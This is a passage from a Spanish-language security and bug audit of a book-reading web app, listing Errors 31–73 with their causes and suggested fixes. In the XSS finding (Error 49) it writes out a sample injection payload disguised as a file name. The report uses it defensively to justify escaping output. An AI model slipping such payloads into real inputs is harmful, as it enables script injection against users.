Los controladores no usan un formato de respuesta consistente. Algunos retornan `{success: true, data: ...}`, otros retornan el objeto directo, otros retornan `{message: ...}` sin `success`. El frontend no puede parsear respuestas de forma uniforme, obligando a manejar cada endpoint de forma diferente. Esto complica el manejo de errores y la validación de respuestas.

**Solución sugerida:**
```js
// backend/src/controllers/index.js — Wrapper de respuesta
function successResponse(data, message = "OK") {
  return { success: true, message, data };
}

function errorResponse(message, code = 400) {
  return { success: false, message };
}

// Usar en todos los controladores:
return res.status(200).json(successResponse(user, "Perfil obtenido"));
return res.status(400).json(errorResponse("Datos inválidos"));
```

---

### Error 31 — rejectBook elimina el libro en lugar de marcarlo como rechazado

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Lógica de negocio  
- **Archivo:** `backend/src/controllers/moderation.js`  
- **Función:** `rejectBook()` — línea ~85  
- **Código afectado:**
```js
// Línea ~85
await book.destroy(); // ❌ Elimina permanentemente
```

**Descripción y Justificación técnica:**  
`rejectBook()` llama `book.destroy()` que elimina el libro permanentemente de la base de datos. Esto pierde el historial de moderación, los metadatos del libro, y cualquier referencia (comentarios, reseñas). Lo correcto sería marcar el libro como `status: "rejected"` para mantener auditoría y permitir revertir la decisión. Además, si hay foreign keys sin CASCADE, `destroy()` puede fallar.

**Solución sugerida:**
```js
// backend/src/controllers/moderation.js — rejectBook
await book.update({ status: "rejected", moderatedAt: new Date() });
// No eliminar: mantener para auditoría
```

---

### Error 32 — AuthService.login() no es usado por el controlador

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Código muerto  
- **Archivo:** `backend/src/services/auth.js`  
- **Descripción y Justificación técnica:**  
`AuthService` define un método `login()` que genera un token correctamente, pero el controlador `auth.js` no lo usa. En su lugar, el controlador hace la validación manual y no genera token (Error 2). Esto significa que la lógica de autenticación está duplicada y desincronizada: si se cambia `AuthService.login()`, no tendrá efecto porque el controlador no lo llama.

**Solución sugerida:**
```js
// backend/src/controllers/auth.js — Usar AuthService.login()
const AuthService = require("../services/auth");

static async login(req, res) {
  try {
    const result = await AuthService.login(req.body.email, req.body.password);
    return res.status(200).json({ success: true, data: result });
  } catch (error) {
    return res.status(401).json({ success: false, message: error.message });
  }
}
```

---

### Error 33 — myList.js usa ruta incorrecta para eliminar libro

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / API rota  
- **Archivo:** `frontend/js/myList.js`  
- **Función:** `removeFromList()`  
- **Código afectado:**
```js
const res = await fetch(`${API_URL}/lists/remove/${bookId}`, { method: "DELETE" });
```

**Descripción y Justificación técnica:**  
La ruta `DELETE /api/lists/remove/:bookId` no existe en el backend. La ruta correcta probablemente sea `DELETE /api/user/lists/:bookId` o similar. La petición recibirá 404 y el libro no se eliminará de la lista del usuario. El usuario verá que el botón "Eliminar de mi lista" no funciona.

**Solución sugerida:**
```js
// frontend/js/myList.js — Verificar ruta correcta en backend
const res = await authFetch(`${API_URL}/user/lists/${bookId}`, { method: "DELETE" });
```

---

### Error 34 — Funciones duplicadas en 4 archivos (initializeProfile y logout)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / DRY / Mantenibilidad  
- **Archivos:** `frontend/js/myList.js`, `readBooks.js`, `books.js`, `bookDetail.js`  
- **Descripción y Justificación técnica:**  
Las funciones `initializeProfile()` y `logout()` están duplicadas en 4 archivos frontend. Cada copia tiene ligeras variaciones, lo que causa comportamiento inconsistente. Si se corrige un bug en una copia, las otras 3 siguen con el bug. Esto viola el principio DRY y hace el mantenimiento 4× más difícil.

**Solución sugerida:**
```js
// Crear frontend/js/shared.js con funciones comunes
export function initializeProfile() { /* ... */ }
export function logout() { /* ... */ }

// Importar en cada archivo:
import { initializeProfile, logout } from "./shared.js";
```

---

### Error 35 — reader.js usa datos dummy como fallback

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / UX  
- **Archivo:** `frontend/js/reader.js`  
- **Código afectado:**
```js
const title = book.title || "El Título del Libro";
const author = book.author || "Autor Desconocido";
```

**Descripción y Justificación técnica:**  
El lector de PDF usa strings dummy ("El Título del Libro", "Autor Desconocido") como fallback cuando no recibe datos del backend. En lugar de mostrar un error o spinner de carga, muestra datos falsos al usuario. Si la API falla, el usuario cree que está leyendo un libro llamado "El Título del Libro" de "Autor Desconocido", lo que es confuso y poco profesional.

**Solución sugerida:**
```js
// frontend/js/reader.js
if (!book || !book.title) {
  document.body.innerHTML = "<p>Error: No se pudo cargar el libro.</p>";
  return;
}
const title = book.title;
const author = book.author || "Autor desconocido";
```

---

### Error 36 — Comentarios guardados en localStorage en lugar de backend

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Persistencia  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `loadCommentsFromAPI()`  
- **Descripción y Justificación técnica:**  
`loadCommentsFromAPI()` guarda y carga comentarios desde `localStorage` además de la API. Esto causa que los comentarios no se sincronicen entre dispositivos. Si un usuario comenta en su móvil, no lo verá en su PC. Los comentarios en localStorage persisten incluso después de que se eliminan del backend, mostrando contenido obsoleto.

**Solución sugerida:**
```js
// frontend/js/bookDetail.js — Eliminar localStorage para comentarios
// Solo usar la API como fuente de verdad
async function loadCommentsFromAPI(bookId) {
  const res = await authFetch(`${API_URL}/books/${bookId}/comments`);
  const data = await res.json();
  return data.data || [];
  // Eliminar: localStorage.setItem("comments_" + bookId, ...)
}
```

---

### Error 37 — Notas del libro solo en localStorage (sin sync con backend)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Persistencia  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `saveBookNotes()`  
- **Descripción y Justificación técnica:**  
`saveBookNotes()` guarda las notas del libro solo en `localStorage`. No hay endpoint de backend para sincronizarlas. Las notas se pierden si el usuario limpia el caché del navegador, cambia de dispositivo, o usa modo incógnito. No hay backup ni recuperación posible.

**Solución sugerida:**
```js
// 1. Crear endpoint en backend: POST /api/books/:id/notes
// 2. Sincronizar en frontend:
async function saveBookNotes(bookId, notes) {
  await authFetch(`${API_URL}/books/${bookId}/notes`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ notes }),
  });
  // Opcional: caché local como fallback offline
  localStorage.setItem(`notes_${bookId}`, notes);
}
```

---

### Error 38 — loadBooks hace fetch sin headers de autenticación

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `loadBooks()`  
- **Código afectado:**
```js
const res = await fetch(`${API_URL}/books`);
```

**Descripción y Justificación técnica:**  
`loadBooks()` usa `fetch()` directo sin `authFetch()`, por lo que no envía el token. Si el backend requiere autenticación para listar libros, la petición fallará con 401. Si no lo requiere, cualquier usuario sin login puede ver todos los libros, lo que puede no ser el comportamiento deseado para contenido premium o restringido.

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/books`);
```

---

### Error 39 — submitComment usa fetch manual en lugar de authFetch

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `submitComment()`  
- **Descripción y Justificación técnica:**  
`submitComment()` construye la petición `fetch` manualmente en lugar de usar `authFetch()`. No envía el token de autenticación, por lo que el backend no puede identificar al usuario que comenta. Si el backend requiere auth para comentar, la petición fallará. Además, no se beneficia del manejo de 401 que debería tener `authFetch` (Error 22).

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/books/${bookId}/comments`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ content: comment }),
});
```

---

### Error 40 — checkMyListStatus usa ruta inexistente

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / API rota  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `checkMyListStatus()`  
- **Código afectado:**
```js
const res = await fetch(`${API_URL}/lists/check/${bookId}`);
```

**Descripción y Justificación técnica:**  
La ruta `GET /api/lists/check/:bookId` no existe en el backend. La petición recibirá 404. Como resultado, el botón "Añadir a mi lista" nunca mostrará el estado correcto (si el libro ya está en la lista). El usuario puede añadir el mismo libro múltiples veces sin saberlo.

**Solución sugerida:**
```js
// Verificar la ruta correcta en backend y usar authFetch
const res = await authFetch(`${API_URL}/user/lists/check/${bookId}`);
```

---

### Error 41 — toggleMyList usa fetch manual en lugar de authFetch

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `toggleMyList()`  
- **Descripción y Justificación técnica:**  
`toggleMyList()` hace `fetch()` manual sin token. El backend no puede identificar al usuario, por lo que no puede añadir/quitar el libro de su lista. La función falla silenciosamente o el backend devuelve error.

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/user/lists/${bookId}`, {
  method: "POST", // o DELETE según el estado
});
```

---

### Error 42 — saveBook usa fetch manual en lugar de authFetch

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `saveBook()`  
- **Descripción y Justificación técnica:**  
`saveBook()` (subir/editar libro) usa `fetch()` manual sin `authFetch()`. No envía el token, por lo que el backend no puede verificar quién sube el libro. Si el backend requiere auth para subir libros, la petición fallará con 401. Además, al ser una operación de escritura, es aún más crítica la autenticación.

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/books`, {
  method: "POST",
  body: formData,
});
```

---

### Error 43 — deleteBook usa fetch manual en lugar de authFetch

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `deleteBook()`  
- **Descripción y Justificación técnica:**  
`deleteBook()` usa `fetch()` manual sin token. Cualquier usuario (o nadie) puede intentar eliminar libros. Si el backend no valida autenticación, un usuario no logueado podría eliminar libros. Esta es una operación destructiva que debe requerir autenticación y autorización.

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/books/${bookId}`, {
  method: "DELETE",
});
```

---

### Error 44 — saveProgressToAPI usa fetch manual en lugar de authFetch

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/reader.js`  
- **Función:** `saveProgressToAPI()`  
- **Descripción y Justificación técnica:**  
`saveProgressToAPI()` guarda el progreso de lectura con `fetch()` manual sin token. El backend no sabe de qué usuario guardar el progreso. El progreso de lectura se pierde o se guarda incorrectamente.

**Solución sugerida:**
```js
const res = await authFetch(`${API_URL}/user/progress`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ bookId, page, percentage }),
});
```

---

### Error 45 — loadPDF hace fetch sin headers de autenticación

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/reader.js`  
- **Función:** `loadPDF()`  
- **Código afectado:**
```js
const res = await fetch(pdfUrl);
```

**Descripción y Justificación técnica:**  
`loadPDF()` descarga el PDF con `fetch()` sin token. Si el PDF está en Supabase Storage con políticas RLS que requieren autenticación, la descarga fallará. Si la URL del PDF es pública, cualquiera con el link puede descargarlo, lo que puede violar derechos de autor.

**Solución sugerida:**
```js
const res = await authFetch(pdfUrl);
// O si la URL ya incluye un token de acceso firmado de Supabase, está OK
```

---

### Error 46 — switchTab usa event global sin parámetro (bookDetail.js)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Bug  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `switchTab()`  
- **Código afectado:**
```js
function switchTab() {
  const tab = event.currentTarget.dataset.tab; // ❌ event global
}
```

**Descripción y Justificación técnica:**  
`switchTab()` usa la variable global `event` en lugar de recibirla como parámetro. `window.event` está deprecado y no funciona en Firefox. En modo estricto y en algunos navegadores, `event` será `undefined`, causando `TypeError: Cannot read properties of undefined (reading 'currentTarget')`.

**Solución sugerida:**
```js
function switchTab(event) {
  const tab = event.currentTarget.dataset.tab;
  // ...
}
// En HTML: onclick="switchTab(event)"
```

---

### Error 47 — logout incompleto en bookDetail.js (no remueve token, no redirige)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Función:** `logout()`  
- **Descripción y Justificación técnica:**  
La función `logout()` en `bookDetail.js` no elimina el token de `localStorage` ni redirige al login. El usuario "cierra sesión" pero el token sigue activo, por lo que sigue logueado en otras pestañas. Es un logout cosmético que da falsa sensación de seguridad.

**Solución sugerida:**
```js
function logout() {
  localStorage.removeItem("token");
  localStorage.removeItem("user");
  window.location.href = "/index.html";
}
```

---

### Error 48 — switchTab usa event global con guard en books.js

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Bug  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `switchTab()`  
- **Código afectado:**
```js
function switchTab() {
  if (!event) return; // Guard anti-crash
  const tab = event.currentTarget.dataset.tab;
}
```

**Descripción y Justificación técnica:**  
Similar al Error 46, pero con un guard `if (!event) return`. Aunque evita el crash, el guard hace que la función no haga nada en Firefox (donde `window.event` no existe). El tab nunca cambia en Firefox. Es un workaround que oculta el problema en lugar de solucionarlo.

**Solución sugerida:**
```js
function switchTab(event) {
  const tab = event.currentTarget.dataset.tab;
  // ...
}
```

---

### Error 49 — updateFileLabel XSS potencial (file.name en innerHTML)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `updateFileLabel()`  
- **Código afectado:**
```js
label.innerHTML = `Archivo: ${file.name}`;
```

**Descripción y Justificación técnica:**  
`file.name` (nombre del archivo seleccionado por el usuario) se inserta en `innerHTML` sin escapar. Un usuario podría crear un archivo con nombre malicioso como `<img src=x onerror=alert(1)>.pdf` y seleccionarlo. Aunque el riesgo es auto-XSS (el usuario se ataca a sí mismo), es una mala práctica y puede combinarse con otros vectores.

**Solución sugerida:**
```js
label.textContent = `Archivo: ${file.name}`;
```

---

### Error 50 — populateCategorySelect XSS potencial (${cat} en option)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `populateCategorySelect()`  
- **Código afectado:**
```js
select.innerHTML += `<option value="${cat}">${cat}</option>`;
```

**Descripción y Justificación técnica:**  
Aunque las categorías son hardcoded actualmente, si se hacen dinámicas en el futuro, `${cat}` en `innerHTML` permitiría XSS. Es una vulnerabilidad latente que debe corregirse preventivamente.

**Solución sugerida:**
```js
const option = document.createElement("option");
option.value = cat;
option.textContent = cat;
select.appendChild(option);
```

---

### Error 51 — renderModEmpty XSS potencial (${message} en innerHTML)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `renderModEmpty()`  
- **Código afectado:**
```js
container.innerHTML = `<p>${message}</p>`;
```

**Descripción y Justificación técnica:**  
`message` se inserta en `innerHTML` sin escapar. Si el mensaje proviene del backend e incluye datos de usuario, podría haber inyección.

**Solución sugerida:**
```js
container.textContent = message;
```

---

### Error 52 — credentials: "include" puede causar problemas de CORS

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / CORS  
- **Archivo:** `frontend/js/login.js`  
- **Código afectado:**
```js
fetch(url, { credentials: "include", ... });
```

**Descripción y Justificación técnica:**  
`credentials: "include"` envía cookies cross-origin. Si el backend no tiene `Access-Control-Allow-Credentials: true` Y `Access-Control-Allow-Origin` no puede ser `*` (debe ser el origen exacto), las peticiones fallarán. Como el backend usa CORS con orígenes específicos (Error 10), esto debería funcionar, pero combinado con el `*` manual en download.js (Error 8), causará errores de CORS en algunos navegadores.

**Solución sugerida:**
```js
// Si se usa token en Authorization header, no se necesita credentials: "include"
fetch(url, {
  headers: { Authorization: `Bearer ${token}` },
  // credentials: "include", // Eliminar si no se usan cookies
});
```

---

### Error 53 — forgotPassword enlace muerto (href="#")

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / UX  
- **Archivo:** `frontend/js/login.js` — línea ~230  
- **Código afectado:**
```html
<a href="#">¿Olvidaste tu contraseña?</a>
```

**Descripción y Justificación técnica:**  
El enlace "¿Olvidaste tu contraseña?" apunta a `#`, lo que no hace nada funcional. El usuario hace clic y no pasa nada (o salta al top de la página). No hay flujo de recuperación de contraseña implementado. Esto frustra a los usuarios que genuinely olvidaron su contraseña.

**Solución sugerida:**
```html
<a href="/forgot-password.html">¿Olvidaste tu contraseña?</a>
<!-- Y crear forgot-password.html con formulario de recuperación -->
```

---

### Error 54 — CATEGORIES hardcoded (100+ strings en código)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Arquitectura / Mantenibilidad  
- **Archivo:** `frontend/js/books.js`  
- **Código afectado:**
```js
const CATEGORIES = ["Arte", "Biografía", "Ciencia", "Comics", ...]; // 100+ strings
```

**Descripción y Justificación técnica:**  
Las categorías están hardcodeadas en el frontend con más de 100 strings. Esto significa que: 1) Para añadir una categoría, hay que modificar el código y redeployar, 2) Las categorías pueden desincronizarse entre frontend y backend, 3) No se pueden gestionar dinámicamente desde un panel admin. Deberían venir del backend.

**Solución sugerida:**
```js
// Obtener categorías del backend
const res = await authFetch(`${API_URL}/books/categories`);
const { data: categories } = await res.json();
// Usar categories dinámicamente
```

---

---

## 🟡 MODERADOS / ARQUITECTURA (Errores 55–66)

---

### Error 55 — cloudinary.js es código muerto (no importado)

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Código muerto  
- **Archivo:** `backend/src/config/cloudinary.js`  
- **Descripción y Justificación técnica:**  
El archivo `cloudinary.js` define configuración de Cloudinary, pero el proyecto usa Supabase Storage. El archivo no es importado por ningún módulo. Además, contiene credenciales hardcoded (Error 7). Su mera existencia confunde a nuevos desarrolladores que pueden pensar que el proyecto usa Cloudinary.

**Solución sugerida:**
```bash
# Eliminar el archivo
rm backend/src/config/cloudinary.js
```

---

### Error 56 — WriterRequest sin CASCADE en foreign keys

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Integridad de datos  
- **Archivo:** `backend/src/models/index.js`  
- **Descripción y Justificación técnica:**  
El modelo `WriterRequest` tiene foreign keys hacia `User`, pero no define `onDelete: CASCADE`. Si se elimina un usuario que tiene solicitudes de escritor, la eliminación fallará con error de foreign key, o dejará registros huérfanos. Lo mismo aplica para `Comment`, `Review`, `UserList`, `UserRead` — todos deberían tener `onDelete: CASCADE` para que al eliminar un usuario o libro, se eliminen sus dependencias.

**Solución sugerida:**
```js
// backend/src/models/index.js
WriterRequest.belongsTo(User, {
  foreignKey: "userId",
  onDelete: "CASCADE", // ✅ Añadir
});

Comment.belongsTo(User, { foreignKey: "userId", onDelete: "CASCADE" });
Comment.belongsTo(Book, { foreignKey: "bookId", onDelete: "CASCADE" });
// Aplicar a todas las relaciones con foreign keys
```

---

### Error 57 — sequelize.sync({ alter: true }) peligroso en producción

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Base de datos  
- **Archivo:** `backend/src/config/database.js`  
- **Código afectado:**
```js
await sequelize.sync({ alter: true });
```

**Descripción y Justificación técnica:**  
`sync({ alter: true })` modifica el esquema de la base de datos automáticamente en cada arranque. En producción, esto puede: 1) Eliminar columnas si se quita un campo del modelo, 2) Cambiar tipos de columnas y perder datos, 3) Causar locks en tablas grandes, 4) Crear migraciones inconsistentes. Es extremadamente peligroso y puede causar pérdida de datos en producción.

**Solución sugerida:**
```js
// Usar migraciones de Sequelize en lugar de sync
// Desarrollo:
await sequelize.sync(); // Solo crea tablas si no existen

// Producción:
// Ejecutar migraciones manualmente:
// npx sequelize-cli db:migrate
// Eliminar sync({ alter: true }) del código de arranque
```

---

### Error 58 — reader.js múltiples console.log de debug

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Limpieza  
- **Archivo:** `frontend/js/reader.js`  
- **Descripción y Justificación técnica:**  
`reader.js` contiene múltiples `console.log` de debug que ensucian la consola del navegador en producción. Esto expone información interna, confunde a los usuarios que abren DevTools, y degrada ligeramente el rendimiento.

**Solución sugerida:**
```js
// Eliminar todos los console.log de debug
// O usar un logger condicional:
const DEBUG = false;
function log(...args) {
  if (DEBUG) console.log(...args);
}
```

---

### Error 59 — download.js console.log de debug en múltiples líneas

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Limpieza  
- **Archivo:** `backend/src/controllers/download.js`  
- **Líneas:** ~55, ~60, ~65, ~100, ~150  
- **Descripción y Justificación técnica:**  
El controlador de descarga tiene múltiples `console.log` que imprimen información de debug en el servidor. En producción, esto llena los logs con ruido, dificulta encontrar errores reales, y puede exponer información sensible (URLs de archivos, IDs de usuarios).

**Solución sugerida:**
```js
// Usar un logger proper como winston o pino
const logger = require("../utils/logger");

// En lugar de:
console.log("Downloading file:", fileId);

// Usar:
logger.info("File download requested", { fileId, userId: req.user?.id });
```

---

### Error 60 — initializeProfile duplicado en 4 archivos frontend

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / DRY  
- **Archivos:** `frontend/js/books.js`, `myList.js`, `readBooks.js`, `bookDetail.js`  
- **Descripción y Justificación técnica:**  
`initializeProfile()` está duplicada en 4 archivos con ligeras variaciones. Esto es el mismo problema del Error 34 pero enfocado en `initializeProfile` específicamente. Cada copia puede mostrar el perfil de forma diferente, causando inconsistencia visual.

**Solución sugerida:**
```js
// Crear frontend/js/shared.js
export function initializeProfile() {
  const user = JSON.parse(localStorage.getItem("user") || "{}");
  const avatar = document.getElementById("userAvatar");
  const name = document.getElementById("userName");
  if (avatar && user.avatar) avatar.src = user.avatar;
  if (name && user.name) name.textContent = user.name;
}

// Importar en cada archivo:
import { initializeProfile } from "./shared.js";
```

---

### Error 61 — settings.js crea <style> dinámicamente (CSS injection)

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Seguridad / CSS injection  
- **Archivo:** `frontend/js/settings.js`  
- **Descripción y Justificación técnica:**  
`settings.js` crea un elemento `<style>` dinámicamente e inyecta CSS basado en preferencias del usuario. Si las preferencias incluyen valores no sanitizados, un usuario podría inyectar CSS malicioso que robe datos (CSS exfiltration) o rompa el layout. Aunque el riesgo es limitado (auto-ataque), es una mala práctica.

**Solución sugerida:**
```js
// Usar CSS variables en lugar de inyectar CSS
document.documentElement.style.setProperty("--theme-color", userColor);
document.documentElement.style.setProperty("--font-size", userFontSize);
// El CSS ya debe tener: color: var(--theme-color);
```

---

### Error 62 — bookDetail.js idioma hardcodeado ("Español")

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Datos hardcodeados  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Código afectado:**
```js
const metaLanguage = "Español"; // Siempre "Español"
```

**Descripción y Justificación técnica:**  
El idioma del libro siempre se muestra como "Español" sin importar el idioma real del libro. Si el libro está en inglés, francés, etc., el usuario verá información incorrecta. El idioma debería venir del backend como parte de los metadatos del libro.

**Solución sugerida:**
```js
const metaLanguage = book.language || "No especificado";
```

---

### Error 63 — bookDetail.js visitas hardcodeadas ("0 visitas")

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Datos hardcodeados  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Código afectado:**
```js
const metaViews = "0 visitas"; // Siempre 0
```

**Descripción y Justificación técnica:**  
El contador de visitas siempre muestra "0 visitas" sin importar cuántas veces se haya visto el libro. No hay tracking real de visitas. Esto da información falsa al usuario y al autor del libro.

**Solución sugerida:**
```js
// 1. Backend: añadir campo views al modelo Book, incrementar en cada GET /books/:id
// 2. Frontend:
const metaViews = `${book.views || 0} visitas`;
```

---

### Error 64 — API_URL hardcodeada en frontend

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Arquitectura / Configuración  
- **Archivo:** `frontend/js/api.js` — línea 1  
- **Código afectado:**
```js
const API_URL = "https://tercero-sofware.onrender.com/api";
```

**Descripción y Justificación técnica:**  
La URL de la API está hardcodeada. Para cambiar entre desarrollo (localhost) y producción, hay que modificar el código manualmente. Esto causa errores cuando los desarrolladores olvidan cambiar la URL antes de deployar, o cuando se despliega a un nuevo entorno.

**Solución sugerida:**
```js
// Detectar entorno automáticamente
const API_URL =
  window.location.hostname === "localhost"
    ? "http://localhost:3000/api"
    : "https://tercero-sofware.onrender.com/api";

// O usar variables de entorno con Vite/webpack
// O usar un <meta name="api-url" content="..."> en HTML
```

---

### Error 65 — express.json({ limit: "50mb" }) vector de DoS

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Seguridad / DoS  
- **Archivo:** `backend/src/app.js` — línea 37  
- **Código afectado:**
```js
app.use(express.json({ limit: "50mb" }));
```

**Descripción y Justificación técnica:**  
El límite de body JSON es 50MB. Un atacante puede enviar un body de 50MB para cada petición, consumiendo memoria del servidor. Con suficientes peticiones simultáneas, el servidor se queda sin memoria (OOM) y cae. El límite debería ser mucho menor (1-5MB) para la mayoría de endpoints, y solo aumentar para rutas específicas que necesiten archivos grandes.

**Solución sugerida:**
```js
// Límite global pequeño
app.use(express.json({ limit: "1mb" }));

// Límite específico para rutas que suben archivos
router.post("/books", express.json({ limit: "50mb" }), bookController.upload);
```

---

### Error 66 — getProfile excluye password manualmente (frágil)

- **Severidad:** 🟡 MODERADO  
- **Categoría:** Seguridad / Arquitectura  
- **Archivo:** `backend/src/controllers/user.js`  
- **Función:** `getProfile()`  
- **Código afectado:**
```js
const user = await User.findByPk(id, {
  attributes: { exclude: ["password"] },
});
```

**Descripción y Justificación técnica:**  
`getProfile()` excluye `password` manualmente con `attributes: { exclude: ["password"] }`. Si un desarrollador olvida este exclude en otro endpoint, la contraseña hasheada se expone. Es más seguro que el modelo `User` nunca retorne el password por defecto, usando un scope default.

**Solución sugerida:**
```js
// backend/src/models/users.js
const User = sequelize.define("User", {
  // ...
}, {
  defaultScope: {
    attributes: { exclude: ["password"] },
  },
  scopes: {
    withPassword: { attributes: { include: ["password"] } },
  },
});

// Usar withPassword solo donde se necesita validar:
const user = await User.scope("withPassword").findOne({ where: { email } });
```

---

---

## 🟢 LEVES / HTML-PWA (Errores 67–78)

---

### Error 67 — index.html enlaces sociales con href="#"

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / UX  
- **Archivo:** `frontend/index.html`  
- **Descripción y Justificación técnica:**  
Los enlaces a redes sociales en el footer usan `href="#"`, lo que navega al top de la página sin abrir ninguna red social. Esto confunde al usuario y parece un sitio incompleto.

**Solución sugerida:**
```html
<!-- En lugar de: -->
<a href="#" class="social-link">Facebook</a>

<!-- Usar URLs reales o eliminar: -->
<a href="https://facebook.com/tu-pagina" target="_blank" rel="noopener">Facebook</a>
```

---

### Error 68 — index.html forgotPassword con href="#"

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / UX  
- **Archivo:** `frontend/index.html`  
- **Descripción y Justificación técnica:**  
El enlace "¿Olvidaste tu contraseña?" usa `href="#"`. Al hacer clic, no hace nada (solo sube al top). El usuario no puede recuperar su contraseña. Debería abrir un modal o redirigir a una página de recuperación.

**Solución sugerida:**
```html
<!-- Opción 1: Modal -->
<a href="#" onclick="openForgotPasswordModal(); return false;">¿Olvidaste tu contraseña?</a>

<!-- Opción 2: Página dedicada -->
<a href="forgot-password.html">¿Olvidaste tu contraseña?</a>
```

---

### Error 69 — books.html openRequestsModal() no definida

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / JS  
- **Archivo:** `frontend/books.html`  
- **Descripción y Justificación técnica:**  
`books.html` llama a `openRequestsModal()` en un botón, pero esa función no está definida en `books.js` ni en ningún archivo JS importado. Al hacer clic, se produce un `ReferenceError` en la consola y no pasa nada.

**Solución sugerida:**
```js
// Añadir en frontend/js/books.js
function openRequestsModal() {
  const modal = document.getElementById("requestsModal");
  if (modal) modal.style.display = "block";
}
```

---

### Error 70 — books.html switchTab no definida en scope

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / JS  
- **Archivo:** `frontend/books.html`  
- **Descripción y Justificación técnica:**  
`books.html` usa `switchTab()` en un `onclick`, pero la función puede no estar en el scope global o no estar definida. Si está dentro de un módulo o IIFE, el `onclick` no la encuentra.

**Solución sugerida:**
```js
// Exponer la función al scope global
window.switchTab = function (tabName) {
  // ... lógica de cambio de tab
};
```

---

### Error 71 — books.html incluye book-detail.css innecesario

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Rendimiento  
- **Archivo:** `frontend/books.html`  
- **Descripción y Justificación técnica:**  
`books.html` incluye `book-detail.css` pero no usa los estilos de detalle de libro. Esto carga CSS innecesario, aumentando el tiempo de carga de la página.

**Solución sugerida:**
```html
<!-- Eliminar esta línea de books.html: -->
<link rel="stylesheet" href="css/book-detail.css">
```

---

### Error 72 — reader.html datos hardcodeados ("197 páginas", "15%", "Hace 2 días")

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Datos hardcodeados  
- **Archivo:** `frontend/reader.html`  
- **Descripción y Justificación técnica:**  
`reader.html` muestra "197 páginas", "15% completado", "Hace 2 días" directamente en el HTML. Estos valores son estáticos y no reflejan el libro real ni el progreso del usuario. Cada libro que se abra mostrará los mismos datos.

**Solución sugerida:**
```html
<!-- En lugar de: -->
<span>197 páginas</span>
<span>15% completado</span>
<span>Hace 2 días</span>

<!-- Usar placeholders que JS rellena: -->
<span id="totalPages">—</span>
<span id="progressPercent">0%</span>
<span id="lastRead">—</span>
```
```js
// reader.js
document.getElementById("totalPages").textContent = `${book.pages} páginas`;
document.getElementById("progressPercent").textContent = `${progress}% completado`;
```

---

### Error 73 — reader.html no carga api.js

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Arquitectura  
- **Archivo:** `frontend/reader.html`  
- **Descripción y Justificación técnica:**  
